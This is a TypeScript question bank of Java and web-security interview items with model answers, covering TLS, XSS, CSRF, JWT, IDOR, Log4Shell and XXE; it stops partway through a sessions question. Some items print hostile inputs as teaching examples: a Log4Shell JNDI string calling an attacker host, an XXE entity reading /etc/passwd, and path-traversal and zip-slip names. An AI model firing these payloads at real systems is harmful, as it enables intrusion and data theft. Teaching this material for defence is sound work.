import type { Question } from '../../types';

/**
 * Security & auth, part two: web fundamentals, Java-specific
 * vulnerability classes, cryptography done right, and org-level defences.
 */
export const SECURITY_MORE_QUESTIONS: Question[] = [
  {
    id: 'sec-11',
    categoryId: 'security',
    title: 'Authentication vs Authorization',
    difficulty: 'Core',
    tags: ['Authentication', 'Authorization', 'Basics', '401 vs 403'],
    scenario: "An API returns 403 when the token is missing and 401 when a user lacks permission. A junior asks what the difference is supposed to be.",
    question: "Define authentication and authorization, and how they map to HTTP status codes and Spring Security.",
    idealAnswer: `### Authentication: who are you?
Verifying identity: passwords, passkeys, OAuth/OIDC tokens, client certificates, API keys. The result is a **principal** (user or service identity) plus attributes.

### Authorization: what may you do?
Deciding whether that principal may perform an action on a resource: roles (RBAC), attributes (ABAC), relationships ('owner of this document'), scopes.

### HTTP status codes
* **401 Unauthorized** (really 'unauthenticated'): no valid credentials. Include \`WWW-Authenticate\`. The client should authenticate.
* **403 Forbidden**: authenticated, but not allowed. Re-authenticating won't help.
* **404** is sometimes used instead of 403 to avoid revealing that a resource exists.
The API in the scenario has them backwards.

### In Spring Security
* Authentication: filters (\`BearerTokenAuthenticationFilter\`, form login) produce an \`Authentication\` stored in the \`SecurityContext\`. Failures go to the \`AuthenticationEntryPoint\` (401).
* Authorization: \`authorizeHttpRequests\` rules and method security (\`@PreAuthorize\`) evaluated by an \`AuthorizationManager\`. Failures go to the \`AccessDeniedHandler\` (403).`,
    pitfalls: [
      "Swapping 401 and 403.",
      "Doing authorization only in the UI.",
      "Treating 'logged in' as sufficient for every action.",
    ],
    followUpQuestions: [
      "When would you return 404 instead of 403?",
      "Where does multi-factor authentication fit?",
    ],
    faangFocus: "A basic security vocabulary check that opens most security discussions.",
  },
  {
    id: 'sec-12',
    categoryId: 'security',
    title: 'What TLS Gives You',
    difficulty: 'Core',
    tags: ['TLS', 'HTTPS', 'Certificates', 'Encryption in Transit'],
    scenario: "An internal service-to-service call uses plain HTTP 'because it's inside the VPC'. Another Java client disables certificate validation to fix a PKIX error.",
    question: "What does TLS provide, how does certificate validation work, and what's wrong with both practices?",
    idealAnswer: `### What TLS provides
* **Confidentiality**: traffic is encrypted.
* **Integrity**: tampering is detected.
* **Authentication** of the server (and, with mTLS, the client) via certificates.

### Handshake in brief (TLS 1.3)
Client and server agree on parameters and perform an ephemeral key exchange (ECDHE), giving **forward secrecy**. The server proves its identity with a certificate chain; the client verifies the chain up to a trusted CA and checks the **hostname** matches. Then symmetric encryption (AES-GCM or ChaCha20) protects the data.

### 'It's inside the VPC'
Internal networks get compromised: a single breached pod can sniff or spoof traffic. **Zero trust** says encrypt and authenticate internally too (service mesh mTLS makes this cheap).

### Disabling certificate validation
A trust-all \`TrustManager\` or disabled hostname verification makes TLS useless against man-in-the-middle attacks: you still encrypt, but to anyone. The \`PKIX path building failed\` error means the JVM doesn't trust the issuing CA. Fix it properly: add the internal CA to a truststore (\`javax.net.ssl.trustStore\` or the client's SSL context, or Spring Boot **SSL bundles**), and keep the JDK's cacerts up to date.

### Settings
TLS 1.2+ only (1.3 preferred), modern cipher suites, HSTS for web, certificate rotation automation (cert-manager, ACME).`,
    pitfalls: [
      "Trust-all TrustManagers copied from Stack Overflow.",
      "Plain HTTP internally.",
      "Expired certificates because rotation is manual.",
    ],
    followUpQuestions: [
      "What is forward secrecy?",
      "How do Spring Boot SSL bundles simplify TLS config?",
    ],
    faangFocus: "Security fundamentals; the trust-all anti-pattern is a common interview trap.",
  },
  {
    id: 'sec-13',
    categoryId: 'security',
    title: 'The OWASP Top 10',
    difficulty: 'Core',
    tags: ['OWASP', 'Web Security', 'Vulnerabilities', 'Overview'],
    scenario: "An interviewer asks: 'Name the OWASP Top 10 categories and give a Java example of how you'd prevent three of them.'",
    question: "Summarise the OWASP Top 10 (2021) and prevention in Java applications.",
    idealAnswer: `### The 2021 list
1. **Broken Access Control**: IDOR, missing checks. Prevent with deny-by-default authorization on every request and object-level checks.
2. **Cryptographic Failures**: plaintext data, weak algorithms. Use TLS everywhere, AES-GCM, proper key management, bcrypt/argon2 for passwords.
3. **Injection**: SQL, OS command, LDAP, expression language. Use \`PreparedStatement\`/JPA parameters, avoid shell invocation, never evaluate user input as SpEL.
4. **Insecure Design**: missing threat modelling, no rate limits on sensitive flows.
5. **Security Misconfiguration**: default passwords, verbose errors, exposed actuator endpoints.
6. **Vulnerable and Outdated Components**: dependency scanning (OWASP Dependency-Check, Snyk, Dependabot), fast patching (Log4Shell).
7. **Identification and Authentication Failures**: credential stuffing, weak session handling. MFA, rate limiting, secure cookies.
8. **Software and Data Integrity Failures**: unsafe deserialization, unsigned updates, CI/CD tampering.
9. **Security Logging and Monitoring Failures**: no audit logs, no alerting.
10. **Server-Side Request Forgery**: validate and restrict outbound URLs, block internal ranges and metadata endpoints.

### Presenting it well
Pick three with concrete Java controls, e.g. parameterised queries (injection), \`@PreAuthorize\` plus ownership checks (access control), and locked-down actuator exposure with \`management.endpoints.web.exposure.include=health,info\` (misconfiguration).`,
    pitfalls: [
      "Listing categories without concrete mitigations.",
      "Treating the list as exhaustive.",
      "Ignoring business logic flaws that no scanner finds.",
    ],
    followUpQuestions: [
      "Why did Broken Access Control move to number one?",
      "How would you secure Spring Boot Actuator?",
    ],
    faangFocus: "The standard web-security overview question.",
  },
  {
    id: 'sec-14',
    categoryId: 'security',
    title: 'Cross-Site Scripting (XSS)',
    difficulty: 'Solid',
    tags: ['XSS', 'Output Encoding', 'CSP', 'Web Security'],
    scenario: "Product reviews containing `<script>` tags execute in other customers' browsers, stealing session tokens stored in localStorage.",
    question: "Explain the types of XSS and a layered defence.",
    idealAnswer: `### Types
* **Stored**: malicious input saved (reviews, profiles) and rendered to other users. The scenario.
* **Reflected**: input from the request (query param) echoed in the response.
* **DOM-based**: client-side JavaScript writes untrusted data into the DOM (\`innerHTML\`, \`eval\`).

### Primary defence: contextual output encoding
Encode data **for the context** where it's inserted: HTML body, HTML attribute, JavaScript, URL, CSS all need different encoding. Template engines (Thymeleaf's \`th:text\`, React's JSX) escape HTML by default; bypasses like \`th:utext\` or \`dangerouslySetInnerHTML\` must never receive untrusted data. For server-side encoding, use the OWASP Java Encoder.

### When HTML is allowed
Rich text must be **sanitised** with an allowlist (OWASP Java HTML Sanitizer, DOMPurify), not by stripping \`<script>\` with regexes.

### Defence in depth
* **Content-Security-Policy**: disallow inline scripts, restrict script sources, use nonces. Blocks most injected scripts even if encoding fails somewhere.
* **HttpOnly cookies** for session tokens: scripts can't read them. Tokens in \`localStorage\` are exposed to any XSS.
* Input validation to reject obviously invalid data (not a substitute for encoding).`,
    pitfalls: [
      "Blacklist filtering of <script>.",
      "Tokens in localStorage.",
      "Using unescaped template output for convenience.",
    ],
    followUpQuestions: [
      "How does a CSP nonce work?",
      "Why is input validation alone insufficient against XSS?",
    ],
    faangFocus: "Core web-security knowledge for full-stack and backend engineers.",
  },
  {
    id: 'sec-15',
    categoryId: 'security',
    title: 'CSRF and When You Need Protection',
    difficulty: 'Solid',
    tags: ['CSRF', 'SameSite', 'Cookies', 'Spring Security'],
    scenario: "A team disables CSRF protection in Spring Security because 'it breaks our POST requests'. The app uses session cookies for authentication.",
    question: "Explain CSRF, when protection is necessary, and how to configure it correctly.",
    idealAnswer: `### The attack
A malicious site makes the victim's browser send a request to your site (a form auto-submit or image tag). The browser **automatically attaches cookies**, so the request is authenticated as the victim: money transferred, email changed.

### When you need protection
When authentication relies on something the browser sends **automatically**: cookies (session or token in a cookie), HTTP Basic, client certificates. APIs authenticated only by an \`Authorization: Bearer\` header set by JavaScript are **not** vulnerable, because other sites can't make the browser add that header.

The scenario uses session cookies, so disabling CSRF protection is a real vulnerability.

### Defences
* **Synchronizer token** (Spring Security's default): a random token tied to the session must be included in state-changing requests (hidden form field or header). For SPAs, \`CookieCsrfTokenRepository\` exposes it in a cookie readable by JavaScript, which sends it back in \`X-XSRF-TOKEN\`.
* **SameSite cookies**: \`SameSite=Lax\` (default in modern browsers) blocks cookies on most cross-site POSTs; \`Strict\` is stronger. A valuable layer, not a complete defence (subdomains count as same-site).
* Check \`Origin\`/\`Referer\` headers.
* Never change state with GET.

### Fixing 'it breaks POSTs'
Make the frontend send the token header, rather than turning protection off.`,
    pitfalls: [
      "Disabling CSRF for cookie-based apps.",
      "State-changing GET endpoints.",
      "Relying solely on SameSite.",
    ],
    followUpQuestions: [
      "Why doesn't a bearer-token API need CSRF protection?",
      "How do subdomains weaken SameSite?",
    ],
    faangFocus: "A frequent Spring Security question with a clear right answer.",
  },
  {
    id: 'sec-16',
    categoryId: 'security',
    title: 'Hashing vs Encryption vs Encoding',
    difficulty: 'Core',
    tags: ['Hashing', 'Encryption', 'Encoding', 'Cryptography Basics'],
    scenario: "A developer stores passwords 'encrypted with Base64' and API secrets hashed with MD5 so they can be 'decrypted' later.",
    question: "Explain the difference between encoding, hashing and encryption, and fix both mistakes.",
    idealAnswer: `### Encoding
Reversible transformation for **representation**, with no key and no secrecy: Base64, URL encoding, UTF-8. Anyone can decode it. Base64 'protects' nothing.

### Hashing
A **one-way** function producing a fixed-size digest. You can't get the input back; you can only compare hashes.
* General-purpose hashes (SHA-256): fast, for integrity checks and fingerprints. MD5 and SHA-1 are broken for collision resistance.
* **Password hashing** must be **slow and salted**: bcrypt, scrypt, **Argon2id**, PBKDF2. Spring's \`DelegatingPasswordEncoder\`/\`BCryptPasswordEncoder\` handle salts and algorithm upgrades.
* **HMAC** (hash + secret key) for message authentication.

### Encryption
Reversible **with a key**: symmetric (AES-GCM) or asymmetric (RSA, ECIES). Use it when you must recover the original value, such as secrets for calling third parties, or PII you need to display.

### Fixing the mistakes
* Passwords: never encrypt or encode; **hash with Argon2id or bcrypt**. You never need the original password.
* API secrets you must use later: you can't 'decrypt' a hash. **Encrypt** them (AES-GCM) with keys in a KMS/Vault, or better, store them in a secrets manager.`,
    pitfalls: [
      "Calling Base64 encryption.",
      "Fast hashes for passwords.",
      "Hashing values you later need in plaintext.",
    ],
    followUpQuestions: [
      "Why must password hashes be slow?",
      "What is a salt and what is a pepper?",
    ],
    faangFocus: "Fundamental crypto vocabulary; mistakes here are disqualifying.",
  },
  {
    id: 'sec-17',
    categoryId: 'security',
    title: 'HTTP Security Headers',
    difficulty: 'Solid',
    tags: ['Security Headers', 'CSP', 'HSTS', 'Clickjacking'],
    scenario: "A security scanner flags a web application for missing HSTS, CSP, X-Content-Type-Options and frame protection headers.",
    question: "What does each header protect against, and how do you set them in Spring?",
    idealAnswer: `### The key headers
* **Strict-Transport-Security** (HSTS): browsers use HTTPS only for this domain for \`max-age\`, preventing SSL-stripping downgrade attacks. Add \`includeSubDomains\`; consider preload.
* **Content-Security-Policy**: restricts where scripts, styles, images and frames may load from, and blocks inline scripts. The strongest XSS mitigation after output encoding. Roll out with \`Content-Security-Policy-Report-Only\` first.
* **X-Content-Type-Options: nosniff**: stops browsers from MIME-sniffing a response into an executable type.
* **frame-ancestors** (CSP) / **X-Frame-Options: DENY**: prevents **clickjacking** by forbidding framing.
* **Referrer-Policy**: limits URL leakage to other sites (\`strict-origin-when-cross-origin\`).
* **Permissions-Policy**: disables browser features (camera, geolocation) you don't use.
* \`Cache-Control: no-store\` on sensitive responses.

### Spring Security
Many are on by default (\`X-Content-Type-Options\`, \`X-Frame-Options\`, cache control, HSTS over HTTPS). Configure the rest:
\`\`\`java
http.headers(h -> h
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; frame-ancestors 'none'"))
    .referrerPolicy(r -> r.policy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)));
\`\`\`

### Where to set them
Either in the app or at the edge (ingress/CDN), but consistently; pure JSON APIs need fewer of them than HTML-serving apps.`,
    pitfalls: [
      "Deploying a strict CSP without report-only testing.",
      "HSTS with a long max-age before every subdomain supports HTTPS.",
      "Allowing unsafe-inline, which undermines CSP.",
    ],
    followUpQuestions: [
      "How does HSTS preloading work?",
      "How would you introduce CSP to a legacy app with inline scripts?",
    ],
    faangFocus: "Practical web hardening knowledge.",
  },
  {
    id: 'sec-18',
    categoryId: 'security',
    title: 'JWT Validation Pitfalls',
    difficulty: 'Hard',
    tags: ['JWT', 'Token Validation', 'alg none', 'Key Confusion'],
    scenario: "A service validates JWTs with a hand-written parser: it decodes the payload, checks `exp`, and verifies the signature using the algorithm named in the token header.",
    question: "What's wrong with this approach, and what must correct JWT validation include?",
    idealAnswer: `### Classic JWT attacks
* **alg: none**: some libraries accepted unsigned tokens when the header said \`none\`.
* **Algorithm confusion**: if the verifier trusts the header's \`alg\`, an attacker can switch RS256 to **HS256** and sign with the server's **public key** as the HMAC secret. The verifier then 'validates' a forged token.
* **kid injection**: an unvalidated \`kid\` header used in a file path or SQL lookup.
* **jku/x5u**: tokens pointing to attacker-controlled key URLs.

### Correct validation
1. **Pin the algorithm(s)** server-side; never take it from the token.
2. Verify the **signature** with the expected key (JWKS fetched from the trusted issuer and cached, selecting by \`kid\` from that set only).
3. Validate claims: \`iss\` (expected issuer), \`aud\` (this service), \`exp\` and \`nbf\` with small clock skew, and required custom claims/scopes.
4. Enforce token type (access vs ID token) where relevant.

### Use a library
Spring Security's resource server (\`oauth2ResourceServer().jwt()\`) with \`issuer-uri\` does discovery, JWKS caching, algorithm pinning and standard claim validation. Add audience validation explicitly. Nimbus JOSE+JWT underneath.

### Also remember
JWTs are **signed, not encrypted**: anyone can read the payload, so no secrets or sensitive PII inside.`,
    pitfalls: [
      "Trusting the alg header.",
      "Skipping audience validation.",
      "Putting sensitive data in JWT payloads.",
    ],
    followUpQuestions: [
      "How does JWKS key rotation work?",
      "Why does audience validation matter with a shared identity provider?",
    ],
    faangFocus: "A strong security question for backend engineers using OAuth2.",
  },
  {
    id: 'sec-19',
    categoryId: 'security',
    title: 'Refresh Tokens, Revocation and Rotation',
    difficulty: 'Hard',
    tags: ['Refresh Tokens', 'Revocation', 'Token Rotation', 'OAuth2'],
    scenario: "Access tokens are valid for 24 hours. When an employee is fired or a phone is stolen, there's no way to cut off access until the token expires.",
    question: "How do you design token lifetimes and revocation?",
    idealAnswer: `### The trade-off
Self-contained JWT access tokens are verified **without calling the auth server**, which scales well, but the resource server can't know if a token was revoked.

### Short-lived access + refresh tokens
* Access tokens: **5-15 minutes**.
* **Refresh tokens**: longer-lived, used only with the auth server to get new access tokens. The auth server checks the refresh token on every use, so **revoking it** cuts off access within one access-token lifetime.

### Refresh token rotation
Each refresh returns a **new** refresh token and invalidates the old one. If an old token is reused, it indicates theft: revoke the whole token family. Essential for public clients (SPAs, mobile).

### Faster revocation when needed
* **Token introspection** (opaque tokens): resource servers ask the auth server each time (with caching). Immediate revocation, more latency and load.
* **Deny lists** of token IDs (\`jti\`) or a per-user 'tokens issued before X are invalid' timestamp, pushed to services or cached in Redis.
* Event-driven revocation (user disabled → event → caches invalidated).

### Storage on clients
Refresh tokens in secure, HttpOnly cookies (via a BFF) or the platform keystore on mobile; never in localStorage.`,
    pitfalls: [
      "Long-lived access tokens with no revocation.",
      "Refresh tokens without rotation for public clients.",
      "Storing refresh tokens in localStorage.",
    ],
    followUpQuestions: [
      "How do you detect refresh token reuse?",
      "When would you choose opaque tokens over JWTs?",
    ],
    faangFocus: "A design question combining security and scalability.",
  },
  {
    id: 'sec-20',
    categoryId: 'security',
    title: 'Service-to-Service Authentication',
    difficulty: 'Solid',
    tags: ['Client Credentials', 'mTLS', 'Service Identity', 'OAuth2'],
    scenario: "Internal services call each other with a shared static API key stored in every service's config. The key hasn't been rotated in three years.",
    question: "What are better options for authenticating services to each other?",
    idealAnswer: `### Problems with a shared static key
No way to tell callers apart, no least privilege (every service can call everything), rotation requires coordinated redeploys, and one leak compromises the whole system.

### OAuth2 client credentials
Each service has its **own client ID and secret** (or private key JWT). It requests an access token from the authorisation server with specific **scopes**, then calls other services with a bearer token. Receivers validate the token and check scopes/audience. Spring Security supports this via \`OAuth2AuthorizedClientManager\` and \`RestClient\` interceptors.
* Per-service identity and permissions, short-lived tokens, central audit.

### mTLS and workload identity
Services present **client certificates**; each side verifies the other. In a service mesh (Istio, Linkerd), sidecars do mTLS automatically with **SPIFFE** identities, and authorization policies say which service may call which. Certificates rotate automatically.

### Cloud-native identity
Kubernetes service account tokens (projected, audience-bound), cloud IAM roles (IRSA on EKS, Workload Identity on GKE) for calling cloud services without static keys.

### Recommendations
Workload identity via mesh mTLS for transport authentication, plus tokens with scopes for application-level authorization, and **no long-lived shared secrets**.`,
    pitfalls: [
      "One shared key for all services.",
      "Secrets never rotated.",
      "Authenticating services but not authorising specific operations.",
    ],
    followUpQuestions: [
      "How would you propagate end-user identity through service calls?",
      "What is token exchange (RFC 8693)?",
    ],
    faangFocus: "Common microservices security design question.",
  },
  {
    id: 'sec-21',
    categoryId: 'security',
    title: 'Broken Object Level Authorization (IDOR)',
    difficulty: 'Solid',
    tags: ['IDOR', 'BOLA', 'Authorization', 'API Security'],
    scenario: "`GET /api/invoices/10432` returns any invoice to any logged-in user who guesses the ID. Endpoint-level security says 'role USER required' and nothing more.",
    question: "Why is this the most common API vulnerability, and how do you prevent it systematically?",
    idealAnswer: `### The flaw
Authorization was checked at the **endpoint** level (is the user allowed to call this API?) but not at the **object** level (is the user allowed to access **this** invoice?). IDs are guessable or leaked, so any user can read others' data. OWASP API Security lists it as number one.

### Fixes
* **Scope queries by the principal**: \`findByIdAndCustomerId(id, currentUser.customerId())\`, returning 404 if not found. The database never returns other users' data.
* **Central authorization checks** for complex rules: \`@PreAuthorize("@invoiceAuth.canRead(#id, authentication)")\` or \`@PostAuthorize("returnObject.customerId == principal.customerId")\`.
* Multi-tenant data: enforce tenant filters at the repository/ORM level (Hibernate filters, PostgreSQL row-level security) as a safety net.
* Unpredictable IDs (UUIDs) reduce guessing but are **not** access control.

### Test it
For every endpoint that takes an ID, a test that user B gets 403/404 for user A's object, including list, search, export and bulk endpoints (see testing authorization rules).`,
    codeSnippet: `@GetMapping("/invoices/{id}")
InvoiceDto get(@PathVariable UUID id, @AuthenticationPrincipal AppUser user) {
    return invoices.findByIdAndCustomerId(id, user.customerId())
            .map(InvoiceDto::from)
            .orElseThrow(NotFoundException::new);
}`,
    pitfalls: [
      "Endpoint-level role checks only.",
      "Relying on UUIDs as protection.",
      "Checking ownership on read but not on update/delete.",
    ],
    followUpQuestions: [
      "How would you enforce this consistently across 300 endpoints?",
      "Should you return 403 or 404 here?",
    ],
    faangFocus: "The most common real-world API vulnerability; very frequently asked.",
  },
  {
    id: 'sec-22',
    categoryId: 'security',
    title: 'Path Traversal and Secure File Uploads',
    difficulty: 'Solid',
    tags: ['Path Traversal', 'File Upload', 'Zip Slip', 'Input Validation'],
    scenario: "A download endpoint serves `Paths.get(\"/data/reports/\", request.getParameter(\"file\"))`. A tester fetches `../../etc/passwd`. Uploaded ZIP files are also extracted on the server.",
    question: "Explain path traversal and zip slip, and how to handle files safely.",
    idealAnswer: `### Path traversal
User input containing \`../\` (or absolute paths, or encoded variants) escapes the intended directory. Fix: resolve and **normalise**, then verify the result is still inside the base directory:
\`\`\`java
Path base = Path.of("/data/reports").toRealPath();
Path target = base.resolve(userInput).normalize();
if (!target.startsWith(base)) throw new ForbiddenException();
\`\`\`
Better still: don't use user-supplied names at all; look files up by an ID in the database that maps to a server-generated path.

### Zip slip
Archive entries can contain names like \`../../app/config.yml\`. Extracting them naively writes outside the target directory, possibly overwriting code. Apply the same normalise-and-check to every entry, and also guard against **zip bombs** (limit total uncompressed size and entry count).

### Secure uploads
* Validate type by **content** (magic bytes), not by extension or client Content-Type.
* Limit size (\`spring.servlet.multipart.max-file-size\`).
* Store outside the web root, with **generated names**; keep the original name only as metadata.
* Scan for malware where appropriate; serve downloads with \`Content-Disposition: attachment\` and correct content types.
* Prefer object storage with pre-signed URLs to keep files off application servers entirely.`,
    pitfalls: [
      "Checking for '../' with string matching.",
      "Trusting file extensions.",
      "Extracting archives without size limits.",
    ],
    followUpQuestions: [
      "Why is startsWith on Path safer than on String?",
      "How do pre-signed URLs work?",
    ],
    faangFocus: "Practical secure-coding question with Java-specific APIs.",
  },
  {
    id: 'sec-23',
    categoryId: 'security',
    title: 'Secure Logging',
    difficulty: 'Solid',
    tags: ['Logging', 'PII', 'Log Injection', 'Compliance'],
    scenario: "A breach review finds full credit card numbers, JWTs and passwords from failed logins in the log aggregation system, which 400 employees can read.",
    question: "What should and shouldn't be logged, and how do you prevent sensitive data from leaking into logs?",
    idealAnswer: `### Never log
Passwords (even failed ones), tokens, API keys, session IDs, full card numbers (PCI DSS forbids it), secrets, and unnecessary personal data. Logs are copied widely, retained long and accessible to many people.

### Do log (security events)
Authentication successes and failures, authorization denials, password/MFA changes, admin actions, and input validation failures on sensitive endpoints, with **who, what, when, where** (user ID, action, timestamp, request ID, source IP). That's what incident response needs.

### Preventing leaks
* Log **DTOs designed for logging**, not whole request objects or entities (\`toString\` on a \`User\` may print the password hash).
* Masking in \`toString\` (records can override it) and **masking layouts/filters** in Logback that redact patterns (card numbers, JWTs, emails).
* Disable request/response body logging in production or make it allowlist-based.
* Scan log output in tests and CI for secret patterns.

### Log injection
User input containing newlines can forge fake log entries; structured JSON logging escapes values. Log4Shell showed that logging libraries can even **execute** lookups in logged strings: keep logging libraries patched.

### Access and retention
Restrict who can read logs, define retention periods, and treat log storage as sensitive data.`,
    pitfalls: [
      "Logging entire request bodies.",
      "toString methods exposing secrets.",
      "No audit trail for security-relevant actions.",
    ],
    followUpQuestions: [
      "How would you implement masking in Logback?",
      "What's the difference between audit logs and application logs?",
    ],
    faangFocus: "Security and compliance awareness expected of senior engineers.",
  },
  {
    id: 'sec-24',
    categoryId: 'security',
    title: 'Log4Shell: Anatomy of a Java Catastrophe',
    difficulty: 'Hard',
    tags: ['Log4Shell', 'JNDI', 'RCE', 'Incident Response'],
    scenario: "December 2021: a single string, `${jndi:ldap://attacker.com/a}`, sent in a User-Agent header, gives attackers remote code execution on millions of Java servers.",
    question: "Explain how Log4Shell worked, why it was so severe, and what it teaches about dependency management.",
    idealAnswer: `### The mechanism (CVE-2021-44228)
Log4j 2 supported **message lookups**: \`\${...}\` patterns inside **logged messages** were interpreted. The \`jndi:\` lookup performed a JNDI query, e.g. to an attacker's **LDAP server**, which could return a reference to a remote Java class. Older JDKs would **download and instantiate** it: remote code execution. Even on newer JDKs (where remote class loading is disabled), attackers could exfiltrate environment variables through lookups or use deserialization gadgets on the classpath.

### Why so severe
* Trivial exploit: any logged user-controlled string (headers, usernames, chat messages) worked.
* Log4j is everywhere, often as a **transitive** dependency nobody knew about, and inside vendor products.
* Pre-authentication, wormable.

### Response steps
Identify every place Log4j 2 runs (SBOMs, dependency trees, scanning container images and JARs, including shaded copies), upgrade to fixed versions (2.17.1+), temporary mitigations (removing the \`JndiLookup\` class), WAF rules, and hunting for signs of compromise.

### Lessons
* Maintain **SBOMs** and know your transitive dependencies.
* Be able to **patch and redeploy the whole fleet within hours**: automated dependency updates, fast CI/CD.
* Features that interpret data as code (lookups, SpEL, templates, deserialization) are dangerous by design.
* Egress filtering would have stopped the outbound LDAP connection.`,
    pitfalls: [
      "Not knowing which services contain a given library.",
      "Slow, manual patch processes.",
      "Unrestricted outbound network access from servers.",
    ],
    followUpQuestions: [
      "How would you find shaded copies of a vulnerable library?",
      "How does egress filtering reduce exploit impact?",
    ],
    faangFocus: "A modern security case study every Java engineer should be able to discuss.",
  },
  {
    id: 'sec-25',
    categoryId: 'security',
    title: 'XML External Entity (XXE) Attacks',
    difficulty: 'Hard',
    tags: ['XXE', 'XML', 'DocumentBuilderFactory', 'SSRF'],
    scenario: "A SOAP/XML import endpoint parses uploaded XML with a default `DocumentBuilderFactory`. A tester's document returns the content of `/etc/passwd` in an error message.",
    question: "How does XXE work and how do you configure Java XML parsers safely?",
    idealAnswer: `### The attack
XML supports **DTDs** with entities. An **external entity** can reference a URI:
\`\`\`xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
\`\`\`
A parser that resolves it reads the file into the document. Variants: SSRF via \`http://internal-service/\`, out-of-band exfiltration, and **billion laughs** (nested entity expansion) for denial of service.

### Why Java is exposed
Many JDK parsers (DOM, SAX, StAX, \`TransformerFactory\`, \`SchemaFactory\`, \`XMLInputFactory\`) historically had DTD processing and external entities **enabled by default**.

### Safe configuration
Disable DTDs entirely where possible:
\`\`\`java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
\`\`\`
For StAX: \`XMLInputFactory.SUPPORT_DTD = false\` and \`IS_SUPPORTING_EXTERNAL_ENTITIES = false\`. Apply equivalent settings to every factory type, centralised in one helper. Jackson XML and JAXB need their own safe setups.

### Defence in depth
Prefer JSON where possible, keep libraries updated, restrict outbound network access, and never echo parser errors containing document content to clients.`,
    pitfalls: [
      "Default parser configuration on untrusted input.",
      "Securing DocumentBuilderFactory but not TransformerFactory or SchemaFactory.",
      "Detailed parser errors returned to clients.",
    ],
    followUpQuestions: [
      "What is the billion laughs attack?",
      "Which JDK system properties limit entity expansion?",
    ],
    faangFocus: "A Java-specific vulnerability class that security-aware interviewers probe.",
  },
  {
    id: 'sec-26',
    categoryId: 'security',
    title: 'Encrypting Data Correctly in Java',
    difficulty: 'Hard',
    tags: ['AES-GCM', 'Encryption', 'Key Management', 'Envelope Encryption'],
    scenario: "A code review finds `Cipher.getInstance(\"AES\")` with a hard-coded key in source code, used to encrypt customers' national ID numbers.",
    question: "What's wrong, and how do you encrypt sensitive data properly?",
    idealAnswer: `### Problems
* \`"AES"\` defaults to **AES/ECB/PKCS5Padding** in most providers. ECB encrypts identical blocks identically, leaking patterns, and provides no integrity.
* A **hard-coded key** in source is shared with everyone who can read the repo or the JAR.

### Use authenticated encryption
**AES-GCM** (\`AES/GCM/NoPadding\`) provides confidentiality **and** integrity:
* A unique **12-byte nonce (IV)** per encryption from \`SecureRandom\`, **never reused** with the same key (reuse is catastrophic in GCM). Store it alongside the ciphertext.
* 128-bit authentication tag.
* Use **associated data** (e.g. the record ID) to bind ciphertext to its context so it can't be swapped between rows.

### Key management
* Keys live in a **KMS** (AWS KMS, GCP KMS, Azure Key Vault) or Vault, not in code or config files.
* **Envelope encryption**: a data encryption key (DEK) encrypts the data; the KMS encrypts the DEK with a key encryption key (KEK). You store the encrypted DEK with the data. Rotation re-wraps DEKs without re-encrypting everything.
* Key versioning in the ciphertext format so old data remains decryptable after rotation.

### Prefer libraries
Google **Tink** (or the cloud providers' encryption SDKs) exposes safe primitives and handles nonces, formats and key rotation, eliminating most footguns.`,
    codeSnippet: `byte[] nonce = new byte[12];
secureRandom.nextBytes(nonce);
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
cipher.init(Cipher.ENCRYPT_MODE, dataKey, new GCMParameterSpec(128, nonce));
cipher.updateAAD(recordId.getBytes(StandardCharsets.UTF_8));
byte[] ciphertext = cipher.doFinal(plaintext);
// store: keyVersion | nonce | ciphertext`,
    pitfalls: [
      "ECB mode via Cipher.getInstance(\"AES\").",
      "Nonce reuse with GCM.",
      "Keys in source code or plain config.",
    ],
    followUpQuestions: [
      "What exactly goes wrong if a GCM nonce is reused?",
      "How would you rotate keys for 100 million encrypted rows?",
    ],
    faangFocus: "Applied cryptography question; the ECB default is a well-known trap.",
  },
  {
    id: 'sec-27',
    categoryId: 'security',
    title: 'Timing Attacks and Constant-Time Comparison',
    difficulty: 'Hard',
    tags: ['Timing Attacks', 'Side Channels', 'MessageDigest.isEqual', 'Webhooks'],
    scenario: "A webhook endpoint verifies an HMAC signature with `expected.equals(provided)`. A security review says it's vulnerable to a timing attack.",
    question: "Explain the attack and how to prevent it.",
    idealAnswer: `### The attack
\`String.equals\` and \`Arrays.equals\` return as soon as they find the first differing character. Comparing a correct prefix takes slightly longer than an incorrect one. With enough requests and statistics, an attacker can guess the signature **byte by byte**, measuring response times to find which guess makes the comparison take longer. Network noise makes it harder, but not impossible, especially from nearby hosts.

### The fix
Use a **constant-time** comparison that always examines every byte:
\`\`\`java
byte[] expected = hmac.doFinal(body);
byte[] provided = HexFormat.of().parseHex(signatureHeader);
if (!MessageDigest.isEqual(expected, provided)) throw new UnauthorizedException();
\`\`\`
\`MessageDigest.isEqual\` is constant-time (since Java 6u17). Compare the raw bytes, not strings.

### Other places where timing leaks
* Login: returning faster for unknown usernames than for wrong passwords reveals which accounts exist (user enumeration). Perform a dummy password hash for unknown users.
* API key lookups: look up keys by a **non-secret prefix/ID**, then constant-time compare a hash of the secret.
* Password reset flows responding differently for existing and non-existing emails.

### Webhook verification also needs
Timestamps in the signed payload and a tolerance window to prevent **replay attacks**.`,
    pitfalls: [
      "String.equals for secrets and signatures.",
      "Different response times or messages for unknown users.",
      "No replay protection for webhooks.",
    ],
    followUpQuestions: [
      "How do webhook providers prevent replay attacks?",
      "How would you prevent user enumeration on a login form?",
    ],
    faangFocus: "A subtle security question that signals depth.",
  },
  {
    id: 'sec-28',
    categoryId: 'security',
    title: 'Session Management and Cookie Security',
    difficulty: 'Solid',
    tags: ['Sessions', 'Cookies', 'Session Fixation', 'HttpOnly'],
    scenario: "A security audit flags the session cookie as missing `Secure` and `HttpOnly`, sessions that never expire, and the same session ID before and after login.",
    question: "Explain each finding and how to configure sessions securely in Spring.",
    idealAnswer: `### Cookie attributes
* **HttpOnly**: JavaScript can't read the cookie, limiting damage from XSS.
* **Secure**: sent only over HTTPS.
* **SameSite=Lax/Strict**: limits cross-site sending, mitigating CSRF.
* A narrow **Path/Domain**; avoid setting the cookie for all subdomains unless needed.
